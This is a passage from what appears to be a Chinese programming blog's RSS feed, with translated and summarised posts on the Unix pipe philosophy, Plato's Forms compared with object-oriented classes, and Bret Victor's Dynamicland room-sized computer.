&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;            - 10 -
    Summary--what&amp;#39;s most important.

To put my strongest concerns into a nutshell:

1. We should have some ways of coupling programs like
garden hose--screw in another segment when it becomes when
it becomes necessary to massage data in another way.
This is the way of IO also.

2. Our loader should be able to do link-loading and
controlled establishment.

3. Our library filing scheme should allow for rather
general indexing, responsibility, generations, data path
switching.

4. It should be possible to get private system components
(all routines are system components) for buggering around with.

                                                M. D. McIlroy
                                                October 11, 1964 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Doug McIlroy将Unix哲学记录为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让每个程序做好一件事。如果要完成一个新任务，重新构建而不是通过添加新的“功能”使旧程序复杂化。&lt;/li&gt;
&lt;li&gt;期望每个程序的输出成为另一个尚未知的程序的输入。不要使用无关信息来污染输出。避免严格的柱状或二进制输入格式。别坚持使用互动输入。&lt;/li&gt;
&lt;li&gt;设计和构建软件，甚至是操作系统，要尽早尝试，最好在几周内完成。毫不犹豫地扔掉笨拙的部分并重建它们。&lt;/li&gt;
&lt;li&gt;使用工具让编程任务变轻松，即使你得先去构建这些工具，用完之后你还可能抛弃它。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;来自&lt;a href="http://emulator.pdp-11.org.ru/misc/1978.07_-_Bell_System_Technical_Journal.pdf"&gt;贝尔系统技术期刊&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我喜欢Unix的是“做好一件事”和“期望每个程序的输出成为另一个程序的输入”的理念。这种理念建立在工具的使用上。这些工具可以单独使用，也可以组合在一起使用以完成工作。这与用于解决特定问题的大一统/一次性的专用程序形成鲜明对比。&lt;/p&gt;
&lt;p&gt;我们在上面看到的系统程序/命令:&lt;code&gt;echo&lt;/code&gt; 默认将信息输出到终端。&lt;code&gt;cat&lt;/code&gt;将“连接”（它的同名）文件并将结果打印到终端。在阅读&lt;a href="http://harmful.cat-v.org/cat-v/unix_prog_design.pdf"&gt;Unix程序设计&lt;/a&gt;时，我意识到将工具的输出打印到用户终端实际上​​是特例。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“也许令人惊讶的是，在实践中，事实证明特例是该程序的主要用途。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当用户将&lt;code&gt;cat&lt;/code&gt;的输出通过&lt;code&gt;|&lt;/code&gt;重定向到其他程序时， &lt;code&gt;cat&lt;/code&gt;变得比原作者想要的更为强大。在我看来，这是最精彩的设计模式之一。一方面，程序变得十分简单，做好一件事的原则让它们轻易制作。更有趣的是，通过与&lt;code&gt;|&lt;/code&gt;操作符结合，程序成为更大规划中的一步。&lt;code&gt;cat&lt;/code&gt;的原作者甚至不需要了解更大的计划。这就是&lt;code&gt;|&lt;/code&gt;的美妙之处, 它可以通过将小而简单的程序组合在一起来解决问题.&lt;/p&gt;
&lt;p&gt;我喜欢这样的软件设计，它鼓励创造，认可简单的价值，并且不会将用户放在盒子里。管道是保持程序简单同时实现可扩展性的关键元素。一个简单的程序通过与&lt;code&gt;|&lt;/code&gt;结合, 能力远远超出原作者梦寐以求的程度。&lt;/p&gt;
&lt;p&gt;希望本文可以帮助你学习一些东西，如果它没做到，只需要把它pipe到&lt;code&gt;/dev/null&lt;/code&gt;。&lt;/p&gt;
&lt;!--组合创造--&gt;

&lt;h1 id="_2"&gt;译者注&lt;/h1&gt;
&lt;p&gt;如果你对管道有更多兴趣，推荐阅读《Unix编程艺术》&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 23 Jan 2019 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2019-01-23:for-the-love-of-pipes.html</guid><category>unix</category></item><item><title>[译]柏拉图与面向对象编程</title><link>/plato-and-object-oriented-programming.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/vp_3883727e.png" /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;他们(哲学家)的职业就是什么事也不做，但是要观察每一件事情；因此，他们常常能把相距遥远和极不相同的事物的力量连结在一起。  -- 亚当·斯密《国富论》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;原文见&lt;a href="https://www.richardfarrar.com/plato-and-object-oriented-programming/"&gt;Plato and Object Oriented Programming&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="_2"&gt;译文&lt;/h1&gt;
&lt;p&gt;面向对象编程代表了一种范式转变，转变自传统的模块化编程方法。今天的计算机科学家无疑是聪明的人，但面向对象编程的基础概念已存在近2500年，它们来自柏拉图的'对话'。&lt;/p&gt;
&lt;p&gt;柏拉图和软件架构师的思维方式似乎存在显着的相关性，即便他们年代相隔数千年。&lt;/p&gt;
&lt;h1 id="_3"&gt;古希腊哲学&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/zh/%E6%9F%8F%E6%8B%89%E5%9B%BE"&gt;柏拉图&lt;/a&gt;出生在古希腊的雅典城，受教于&lt;a href="https://zh.wikipedia.org/zh/%E8%8B%8F%E6%A0%BC%E6%8B%89%E5%BA%95"&gt;苏格拉底&lt;/a&gt;（苏格拉底被认为是西方哲学之父）。柏拉图是古希腊哲学家中（也许是所有哲学家中）最著名的一位。他通过丰富的著作遗产对现代哲学产生了深远的影响，这些著作包括&lt;a href="http://en.wikipedia.org/wiki/Plato#Plato.27s_Dialogues"&gt;35篇对话&lt;/a&gt;和13份书简。&lt;/p&gt;
&lt;p&gt;柏拉图的著作涵盖众多哲学主题。在这些主题中，我们将他激进的&lt;a href="https://zh.wikipedia.org/zh/%E5%BD%A2%E4%B8%8A%E5%AD%B8"&gt;形而上学&lt;/a&gt;概念，与面向对象编程做个比较。从根本上说，柏拉图的&lt;a href="http://en.wikipedia.org/wiki/Theory_of_Forms"&gt;形式(Forms)论&lt;/a&gt;与面向对象编程OOP的基础概念相近。&lt;/p&gt;
&lt;h2 id="_4"&gt;形式论&lt;/h2&gt;
&lt;p&gt;纵观他的形而上学，柏拉图把形式（Forms）看作一种抽象表示，它是真实世界的物体/特征的模板(templates/patterns)。&lt;/p&gt;
&lt;p&gt;举例来说，为了解释&lt;code&gt;形式&lt;/code&gt;的概念，柏拉图讨论了&lt;code&gt;美&lt;/code&gt;的概念。一朵花是&lt;code&gt;美&lt;/code&gt;的，一幅画也可以说是&lt;code&gt;美&lt;/code&gt;的，但它们并不是&lt;code&gt;美&lt;/code&gt;本身。柏拉图认为，真正的&lt;code&gt;美&lt;/code&gt;的形式独立于拥有它的物体而存在，因此我们可能有一个完美的&lt;code&gt;美&lt;/code&gt;的概念，但永远无法亲身体验它。&lt;/p&gt;
&lt;p&gt;按照柏拉图的说法，一朵花被称为分享&lt;code&gt;美&lt;/code&gt;的形式。它是美丽的，但我们从未见过真正的&lt;code&gt;美&lt;/code&gt;。这种花被认为是一个美的实例，从众多形式（其中一个就是&lt;code&gt;美&lt;/code&gt;）中继承特质。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;美&lt;/code&gt;的&lt;code&gt;形式&lt;/code&gt;是不变的，而一朵花可能在一段时间内拥有&lt;code&gt;美&lt;/code&gt;，但最终在它枯萎死亡时会失去它。作为抽象，形式独立于继承其品质的现实世界对象(或者实例)。&lt;!--完全是推理式的 假设 猜想 概念和逻辑系统--&gt;&lt;/p&gt;
&lt;h1 id="_5"&gt;计算机编程&lt;/h1&gt;
&lt;h3 id="_6"&gt;传统方法&lt;/h3&gt;
&lt;p&gt;计算机程序在本质上是有序的指令列表: 完成A，然后完成B等。这有点像跟着烹饪菜谱一步一步操作。&lt;/p&gt;
&lt;p&gt;随着计算机越来越先进，相关软件程序也变得更加冗长和复杂。通常，计算机需要一次又一次地运行相同的代码。因此，不应每次需要时都重写这段代码，而是将函数(functions)或过程(procedures)写成半隔离的代码片段，需要时就调用它们。这有助于软件以模块化的方式开发，各个模块负责某些计算过程。&lt;/p&gt;
&lt;h3 id="oop"&gt;面向对象编程(OOP)&lt;/h3&gt;
&lt;p&gt;面向对象编程将模块带入了下个阶段，模块成为自包含的代码片段，它们被称作&lt;code&gt;类&lt;/code&gt;(classes). &lt;!--这只是实现 核心是概念 按照这种思考方式--&gt;&lt;/p&gt;
&lt;p&gt;一个&lt;code&gt;类&lt;/code&gt;(Class)是一堆程序代码，用做创建对象(object)的模版, 正如柏拉图的形式(Forms)是真实事物的抽象哲学模板(templates)。这段代码或&lt;code&gt;类&lt;/code&gt;不是对象(object)本身，而像柏拉图式的形式(Forms)，只是描述对象实际是怎样的以及具有什么属性的模板(templates)。与柏拉图完全相同概念，转换到一个不同的学科，中间相隔了2500年！&lt;/p&gt;
&lt;p&gt;与柏拉图的形式的分层系统相似，类或模板也可以被增强。通过创建扩展类，继承父类的所有属性，同时又可以添加它自己的额外属性。(译者注: 我认为柏拉图似乎没有想清楚不同形式之间的关系问题，他也没有阐述分层系统,对话中巴门尼德指出柏拉图形式的一些问题，柏拉图似乎没有重视。这点罗素在《西方哲学史》里有指出)&lt;/p&gt;
&lt;!--柏拉图的类之间的关系 并没有讨论，是否有类的类
柏拉图如果用它的形式论 去构建面向对象语言 类的集成会成为一个问题，他的辩论者以及指出这点 但被他忽略了。
--&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 1: // Our template or perfect form of a chair
 2: class Chair
 3: {
 4: // bits of code to define the chair goes in here
 5: }
 6:
 7:
 8: // New template for a type of chair inheriting properties from the perfect chair form
 9: class OfficeChair extends Chair
 10: {
 11:     // bits of EXTRA code for the office chair goes in here 
 12: }
 13:
 14:
 15: // Create an actual object, or particular of the office chair
 16: $objMyOfficeChair = new OfficeChair();
 17:
 18: // Create an another object, or particular of the office chair
 19: $objMyOtherOfficeChair = new OfficeChair();
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是一个极其简化的例子，从中可以看到类之于对象 与 柏拉图形式之于实例的类比。&lt;/p&gt;
&lt;h3 id="_7"&gt;太阳底下无新事物&lt;/h3&gt;
&lt;p&gt;虽然我们可能认为自己是行走在这个星球上最聪明的一代，但我们可能得谦卑一些，通常我们只是在用新瓶装旧酒。&lt;/p&gt;
&lt;p&gt;圣经 传道书1:9-10 里说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;已有的事, 后必再有, 已行的事, 后必再行, 日光之下并无新事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;艾萨克·牛顿向前人的灵感致敬道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果说我看得比别人更远些，那是因为我站在巨人的肩膀上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="_8"&gt;寻求灵感&lt;/h1&gt;
&lt;p&gt;如果你正在努力思考问题的答案，或想找到一种新的做事方式，不如试着从经典中寻求灵感。&lt;/p&gt;
&lt;p&gt;通过研究历史&lt;!--思想史--&gt;，即使是不同学科中的历史，也可能让你遇到一些想法，这些想法可以迁移到你目前的专业领域，并带着你前往梦寐以求的地方。这个过程甚至被赋予了名字 -- 思想的交叉施肥。&lt;/p&gt;
&lt;p&gt;下次你遇到问题时，会转向哪儿寻找灵感？柏拉图？亚里士多德？&lt;/p&gt;
&lt;h1 id="_9"&gt;译者注&lt;/h1&gt;
&lt;p&gt;在此列出巴门尼德指出的&lt;code&gt;形式/理念&lt;/code&gt;所存在的问题，这些问题可能会以其他形式出现在面向对象编程中.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）个体是分享全部的理念呢，还仅仅是分享其一部分呢？无论是哪一种观点，都可以有反驳的理由。如果是前者，那么一个事物就必须同时存在于许多地方；如果是后者，则理念既然是不可分割的，那么一个具有“小”的一部分的事物就要比“绝对的小”更加小，而这是荒谬的。（2）当一个个体分享一个理念的时候，个体和理念就是同样的；所以就必须另有一个既包含这个个体又包含原来的理念的理念。于是就必须再有一个理念包括这个个体和这两个理念，如此类推从至无穷。这样，每一个理念就不止是一个，而会变成为理念的一个无穷系列。（这和亚里士多德关于“第三个人”的论证是同样的。）（3）苏格拉底提示说，理念也许仅仅是思想；但是巴门尼德指出，思想必须是关于某种事物的。（4）由于以上第（2）条所举的理由，所以理念便不能与分享它们的个体相似。（5）如果有任何理念存在的话，它也一定不能被我们所认识，因为我们的知识不是绝对的。（6）如果神的知识是绝对的，他就不能认识我们，因此也就不能统治我们。  --《西方哲学史》 第十五章 理念论&lt;/p&gt;
&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 29 Dec 2018 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2018-12-29:plato-and-object-oriented-programming.html</guid><category>code</category></item><item><title>"下一件大事"是一个房间</title><link>/the-next-big-thing-is-a-room.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/dynamicland_ad8a0196.png" /&gt;&lt;/p&gt;
&lt;p&gt;Steve Krouse于2018.10.2在&lt;a href="https://phenomenalworld.org/"&gt;The Phenomenal World&lt;/a&gt;发表了一篇名为&lt;a href="https://phenomenalworld.org/metaresearch/the-next-big-thing-is-a-room"&gt;The "Next Big Thing" is a Room&lt;/a&gt;
的文章。上周在&lt;a href="https://news.ycombinator.com/"&gt;Hacker News&lt;/a&gt;上读到这篇文章后，兴奋不已。&lt;/p&gt;
&lt;p&gt;我近期正在尝试写文献综述风格的文章，&lt;a href="https://blog.just4fun.site/programming-as-a-way-of-thinking.html"&gt;编程作为一种思考方式&lt;/a&gt;是这个体裁的第一次尝试，本文是第二次尝试。&lt;/p&gt;
&lt;h1 id="the-phenomenal-world"&gt;The Phenomenal World&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://phenomenalworld.org/about"&gt;现象世界&lt;/a&gt;(The Phenomenal World)是份有趣的刊物。名字听起来像一份哲学刊物，它愿意刊载的主题却十分广泛:&lt;a href="https://en.wikipedia.org/wiki/Meta-research"&gt;元研究&lt;/a&gt;(metaresearch)、数字伦理(digital ethics)，保障收入，高等教育财政，或社会科学，哲学，经济史以及其他类似领域。&lt;/p&gt;
&lt;h1 id="_1"&gt;"下一件大事"是一个房间&lt;/h1&gt;
&lt;h3 id="_2"&gt;房间&lt;/h3&gt;
&lt;p&gt;如果你不抬头，Dynamicland看起来就像是&lt;a href="https://zh.wikipedia.org/zh/%E5%A5%A5%E5%85%8B%E5%85%B0_(%E5%8A%A0%E5%88%A9%E7%A6%8F%E5%B0%BC%E4%BA%9A%E5%B7%9E)"&gt;奥克兰&lt;/a&gt;市中心一栋普通建筑二楼的普通房间。桌子和椅子，沙发和地毯，分散的办公用品以及墙上贴着的照片。这是一个温馨的空间，像是一所小学的教室，而不是一个共享的环境。但Dynamicland不是一个普通的房间。Dynamicland被设计成除了正常之外的任何东西。&lt;/p&gt;
&lt;h3 id="dynamicland"&gt;Dynamicland&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://dynamicland.org/"&gt;Dynamicland&lt;/a&gt;由著名的界面设计师&lt;a href="http://worrydream.com/"&gt;Bret Victor&lt;/a&gt;领导，是&lt;a href="https://harc.ycr.org/"&gt;HARC（人类进步研究社区）&lt;/a&gt;的分支，最近成为了&lt;a href="https://ycr.org/"&gt;YCombinator Research&lt;/a&gt;的一部分。Dynamicland是为任何人都无法预料的计算机未来，所绘制的最不可思议的愿景。&lt;/p&gt;
&lt;p&gt;让我们把目光落在房间里。随手拾起一张散落在房间里的纸片，选择那些边角上有彩色圆点的。暂时不必太关注这些圆点。你可能注意到了纸上的文字好像是计算机代码。这是一种奇怪的组合: 虚拟世界的计算机代码搁置在现实世界的纸张上。此刻，它们就在你手中。接下来把纸张放在桌子上。&lt;/p&gt;
&lt;p&gt;&lt;img width=600 src="http://wwj-fig-bed.just4fun.site/dynamicland_6dcad8c4.png" /&gt;
Photo by by Alex Handy&lt;/p&gt;
&lt;p&gt;现在你发现这根本不是一个普通的房间。突然间，桌子上出现了其他东西。动态且可见的东西(当然也是虚拟的)。它们甚至可能发出声音。拿起更多的纸片(带有彩色圆点)。把它们放在桌子上。现在，这个房间里的各种图案、人物和声音都聚在了你身边。它们沿着桌子生长、移动和扭曲，彼此相互作用，它们也可能与桌子上的物理实体相互作用，如冰棒棍，彩色方块以及小机器人。&lt;/p&gt;
&lt;p&gt;然而它仍然只是一个房间。不是虚拟现实,不是增强现实,当然也不是区块链现实。这是一个再正常不过的房间。直到你开始抬头看。&lt;/p&gt;
&lt;p&gt;当你抬头看的时候，你会发现天花板很满，挂着几十台高功率的投影仪，摄像机和扬声器，它们都指向房间。等着你用代码让它们活跃起来。&lt;/p&gt;
&lt;p&gt;Dynamicland是一种新型计算机。它不是放在口袋里的小工具，也不是你可以放进包里的小工具。整个房间本身就是电脑。&lt;/p&gt;
&lt;p&gt;&lt;img width=600 src="http://wwj-fig-bed.just4fun.site/dynamicland_1e470c94.png" /&gt;
Illustration by Dynamicland&lt;/p&gt;
&lt;p&gt;一个房间大小的电脑？没有屏幕？这是什么过时的观念！这个愿景看起来与我们热盼的虚拟现实截然不同。&lt;/p&gt;
&lt;p&gt;&lt;img width=600 src="http://wwj-fig-bed.just4fun.site/dynamicland_ab3b93ab.png" /&gt;
Tye Sheridan in Ready Player One. &lt;/p&gt;
&lt;p&gt;随着手机和电脑变得越来越好，我们越来越远离物理现实，我们也越来越想彻底抛弃它。我们厌倦了自己有物理限制的身体、背部疼痛、眼睛凹陷、手指关节紧张，如Victor说的:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们几乎已经放弃了身体。我们工作时坐在办公桌前，玩耍时坐在沙发上，在两者之间运送自己时也是坐着。我们不得不发明这种特殊的人工“运动”概念，以防止我们的身体完全萎缩。&lt;br /&gt;
不久我们的日常活动几乎都是由某种“计算机”来调节。
如果这些计算机不属于物理环境，如果它们绕过身体，那么我们就创造了一个人们将会完全不动的未来生活方式。&lt;br /&gt;
你想要这样的未来吗，为何它会是一件好事呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在&lt;a href="https://vimeo.com/115154289"&gt;人类的思想表达&lt;/a&gt;中，Bret Victor指着人类上升和下降的图片说，“这就是现在知识工作的意义所在。这就是思想家的意义所在。这意味着人们在一个小矩形前坐着和使用符号......这种知识的运作方式、这种生活方式是不人道的。“&lt;/p&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/dynamicland_656d64a4.png" width=500 /&gt;&lt;/p&gt;
&lt;p&gt;我们的电脑把我们引诱到了我们自制的牢笼里。
我们已经将自己缩减为无形的头脑、紧张的眼睛，抽搐着点击、打字的指尖。我们的手臂、腿部、背部、躯干、双脚、脚趾、鼻子、嘴巴、手掌和耳朵已消失不见。
当我们做着引以为豪的知识工作时，我们只是自己的一小部分。在我们离开办公室回家之前，我们身体的其余部分一无所事。&lt;/p&gt;
&lt;p&gt;比起将我们与身体分隔更糟糕的是，我们的设备已经将我们与他人彼此隔离。
当我们与朋友交谈时，当我们走在街上、躺在床上、手握方向盘时，我们目光在何处？
我们当然知道它们本该在哪里，但它们大部分时间都不在它们该在的地方。我们口袋里的小方块完全吸引了我们的注意力。&lt;/p&gt;
&lt;p&gt;最糟糕的是，我们已经忘记了计算机最突出的部分：它们的可塑性。我们已经默许，将创造虚拟世界的权利，让渡给那些 能够花费巨资去雇佣足够多的软件工程师的人们。那些击中我们眼睛的光子来自完全可替代像素，但对于我们大多数人来说，这些像素似乎都是用石头雕刻般不可修改。&lt;/p&gt;
&lt;p&gt;智能手机应用程序就像从前的厨房用具一样，是一种经过精心设计的单一用途工具，只有极少的可定制性和互操作性。它们有数百万行怪异的代码，只有一大批程序员才能驯服。 一旦人们付了钱，孩子们就会得到神奇的长方形，这些长方形像真正的魔法一样难以理解。&lt;/p&gt;
&lt;!--
对用户体验负责
apple成功了
沃兹尼亚克
PC的塑造者
--&gt;

&lt;p&gt;这一切似乎都是不可避免的。这也是为何Dynamicland如此出乎意料和令人耳目一新。Bret Victor所做的工作与硅谷的"破坏性"技术专家完全不同。Victor致力于“增强人类智慧”和“确保人类智慧超越人类力量”，就像&lt;a href="https://en.wikipedia.org/wiki/Vannevar_Bush"&gt;Vannevar Bush&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Vannevar_Bush#Memex_concept"&gt;Memex&lt;/a&gt;），&lt;a href="https://en.wikipedia.org/wiki/J._C._R._Licklider"&gt;JCR Licklider&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/ARPANET"&gt;ARPANET&lt;/a&gt;），&lt;a href="https://en.wikipedia.org/wiki/Ivan_Sutherland"&gt;Ivan Sutherland&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Graphical_user_interface"&gt;图形用户界面&lt;/a&gt;），&lt;a href="https://en.wikipedia.org/wiki/Douglas_Engelbart"&gt;Douglas Engelbart&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Computer_mouse"&gt;电脑鼠标&lt;/a&gt;，&lt;a href="https://en.wikipedia.org/wiki/Human%E2%80%93computer_interaction"&gt;HCI&lt;/a&gt;,&lt;a href="https://en.wikipedia.org/wiki/The_Mother_of_All_Demos"&gt;the mother of all demos&lt;/a&gt;），&lt;a href="https://en.wikipedia.org/wiki/Seymour_Papert"&gt;Seymour Papert&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Seymour_Papert#Logo"&gt;LOGO&lt;/a&gt;），&lt;a href="https://en.wikipedia.org/wiki/Alan_Kay"&gt;Alan Kay&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Object-oriented_programming"&gt;面向对象编程&lt;/a&gt;，&lt;a href="https://en.wikipedia.org/wiki/Window_(computing)"&gt;图形计算机窗口&lt;/a&gt;，&lt;a href="https://en.wikipedia.org/wiki/Desktop_metaphor"&gt;桌面隐喻&lt;/a&gt;），&lt;a href="https://en.wikipedia.org/wiki/Ted_Nelson"&gt;Ted Nelson&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Hypertext"&gt;超文本&lt;/a&gt;，&lt;a href="https://en.wikipedia.org/wiki/Hypermedia"&gt;超媒体&lt;/a&gt;）和&lt;a href="https://en.wikipedia.org/wiki/Mitchel_Resnick"&gt;Mitch Resnick&lt;/a&gt;（&lt;a href="https://en.wikipedia.org/wiki/Scratch_(programming_language)"&gt;Scratch&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;在许多方面，Dynamicland的联合创始人艾伦·凯(Alan Kay)需要对今天的计算机外观和工作方式负主要责任。1979年臭名昭著的乔布斯访问了施乐帕罗奥多研究中心(Xerox PARC)，后来在Apple Macintosh中使用了许多艾伦·凯的想法（之后Mac又被Windows抄袭）。鲜为人知的是，1975年，艾伦·凯提出了一款计算平板电脑，即“Dynabook”，它与现代iPad非常相似！&lt;/p&gt;
&lt;p&gt;理解Dynamicland的一种方法是 将其视为对Xerox PARC取得巨大成功之后的后悔反应。今天的计算机只是计算的一种可能图景 -- 不是唯一的，也不是最好的。Bret向我们展示了更好的前进方向。一台更人性化的电脑。那台电脑不是一台设备。而是一个看似正常的房间。&lt;/p&gt;
&lt;p&gt;我们本不应该如此意外。几乎每栋建筑物里的房间都无声无息地采用嵌入天花板的技术--灯！它如此普遍，我们习惯忽视它。每个房间都配有一些墙上的按钮来控制这些灯。按需照明是我们基础设施的一部分。&lt;/p&gt;
&lt;p&gt;灯不是我们随身携带的充电装置。想象一下，人们携带手电筒，无论走到哪里都发射一簇小锥光，世界将会变暗多少。这将是一个小而孤独的个人世界，一个每次只能看到一件事物的世界，一个你的一只手总是充满电子设备的世界。&lt;/p&gt;
&lt;p&gt;这就是Dynamicland试图向我们展示的：我们确实生活在那个雾化的手持世界中。我们随身携带着为我们眼睛准备的个人计算设备。人们热切期待新技术可以在Apple Store中排队等待和购买，而不是作为公用事业进行投资和共享。&lt;/p&gt;
&lt;p&gt;当你投资公共设施，如道路、电力、照明，你将物超所值。你“免费”获得了许多东西。在Dynamicland中也是如此。我们将得到许许多多源自其设计的“免费”副产品。&lt;/p&gt;
&lt;p&gt;首先，您可以免费获得“多人游戏”、Google-docs式的协作。在Dynamicland，计算即社交，就像烹饪是社交的。它也像烹饪一样发生在物理世界里。你不是坐在单人屏幕前，而是使用一系列工具在开放空间中走动。走向某人“烹饪”的某些代码、伸出援助之手、分配任务以及即兴创作，都是极为自然的。你可以随意地运用双手来操作：&lt;/p&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/dynamicland_472a5998.png" width=500 /&gt;
Photo by Bret Victor&lt;/p&gt;
&lt;p&gt;当我在1月份访问Dynamicland时，我正在构建一个类似电子表格的程序，旁边是我的朋友Omar，他正在构建一个基于地图的界面。我们相邻而坐，能够随时了解对方的情况。有时，Omar需要一种方式来输入数字以控制地图缩放。我的电子表格程序有很多数字，以及操纵数字的方法，所以我们将我的一张纸滑过去，它立即就放大了他的地图。Omar更想要基于滑块(slider)的数字输入，在它被构建之后，他将它滑到我的桌子边，我们使用了一个乘法运算符来扩展滑块的范围。它再次生效了。在Dynamicland，您可以“免费”获得可组合性和互操作性。&lt;/p&gt;
&lt;p&gt;你在Dynamicland中之所以能“免费”获得大部分内容，是因为它嵌入在一个非常强大的计算引擎中，这个引擎就是&lt;code&gt;现实&lt;/code&gt;。现实世界天然是为多人建造的。现实世界还有许多用于输入数据的设计：按钮，页面，布局和拖放。在Dynamicland中，没有必要编写任何代码。我们可以将该计算外包给它的原始来源，并且仅通过天花板上的摄像头捕获它。Omar建造的滑块是一条长条纸上的鹅卵石。&lt;a href="https://www.youtube.com/watch?v=Z0GB5ClzBA0"&gt;我做的数字&lt;/a&gt;是方形的纸片，你可以把彩色的方块放在上面，每种颜色的方块代表10的不同倍数。复制粘贴实际上就是一个复印件，可以用胶水粘贴到你想要的东西上。拖放就是动手移动物体。UI设计中的短语 “直接操纵”(direct manipulation)和“所见即所得”（WYSIWYG）在Dynamicland中具有非常直接的含义。&lt;/p&gt;
&lt;p&gt;Dynamicland被设计成可理解的，并且可由任何人修改。这个空间几乎有着杰斐逊式的乡土个人主义精神。代码始终以普通格式显示，并在纸页上打印。此外，编写超过11x17尺寸的纸张的代码被认为是“糟糕的风格”。整个系统Realtalk OS仅有数千行代码，代码张贴在背靠背的两个白板上。&lt;/p&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/dynamicland_141fa67f.png" width=600 /&gt;
Realtalk OS by Bret Victor&lt;/p&gt;
&lt;p&gt;默认情况下，它具有可理解性，可定制性和混搭能力，与我们手机屏幕上华丽优美又彼此隔绝的应用程序形成鲜明对比。人们构建“工具包”，而不是应用程序，各种页面通过聚合而相互增强。我的朋友&lt;a href="https://rsnous.com/posts/notes-from-dynamicland-geokit/"&gt;Omar花了很多时间把Geokit放在一起&lt;/a&gt;，它允许你打印出地图，移动它们，放大和缩小，以及叠加人口统计数据。但它只是一个工具包，只是盒子里的几张纸而已。你可以将它与你创建的其他小型纸质程序或其他工具包一起使用，又或是通过强行修改它的代码来解决问题。如果你所做的更改是好的，就取来“打印此页”页面并将其指向修改后的代码。热乎乎的的新版本将在打印机前等你。&lt;/p&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/dynamicland_75203c83.png" width=800 /&gt;
Geokit’s parts by Omar Rizwan&lt;/p&gt;
&lt;p&gt;这种流动而灵活的媒介可以重塑儿童与技术的关系。想象一下，孩子们放弃了Flappy Bird，Minecraft或Fortnite，他们共同参与创造一个混合了数字和物理实体的游戏。这是数字时代的虚构方式。&lt;/p&gt;
&lt;p&gt;&lt;img width=800 src="http://wwj-fig-bed.just4fun.site/dynamicland_ad8a0196.png"&gt;
From the Dynamicland Zine&lt;/p&gt;
&lt;p&gt;同样不难想象,一个未来的Dyanmicland风格的起居室，一个家庭可以在几个小时内发明出像激光袜这样的新游戏，并在同一个晚上来玩耍它！&lt;/p&gt;
&lt;p&gt;&lt;img width=800 src="http://wwj-fig-bed.just4fun.site/dynamicland_0de3f5a9.png" /&gt;
Laser Socks by Glen Chiaccchieri&lt;/p&gt;
&lt;p&gt;印刷机也许是帮助我们了解周围世界的最佳工具。大众印刷的文字在人类的每个角落都给了我们革命：马丁路德的九十五篇论文引起的宗教革命; 洛克、潘恩和报纸引起的政治革命; 牛顿、伽利略的研究刊物引起的科学革命; 小说的诞生引起的艺术革命。作为一个社会，我们认为这种新媒体应该掌握在公民手中，提升和启发我们所有人。拥有一个自由的新闻和公众阅读氛围是民主的必要条件。这就是我们为何建立了图书馆：看似正常的房间，对公众开放，并且充满了人类各个时代最好的思想家的知识。&lt;/p&gt;
&lt;p&gt;如果你走进今天的图书馆，那些曾被人引以为豪的书籍，大多积满灰，落满尘。虽说偶尔有人翻阅一下，但实体书已是明日黄花。通过数字屏幕，它们可以变得更易获取也更便捷 -- 尽管仍然不便宜。图书馆仍有其用途。如果你躲在书堆上，往后看去，你将看到座位挤满了各色人群。大多数人都在他们的计算机上，有些是在图书馆提供的计算机上，少数人在读书。在这个美丽的公共空间里，每个人都在自己的世界里做自己的事情，难道不是有点令人难过吗？大家没有交流。没有合作。&lt;/p&gt;
&lt;p&gt;如果我们决定重构我们的公共知识空间以适应今天的新媒体，我们该怎么办？如果我们想重构公共空间，让它们真正开放、真正共享，并扭转上一次媒体革命带来的雾化影响(人们彼此隔离)，又该怎么办？&lt;/p&gt;
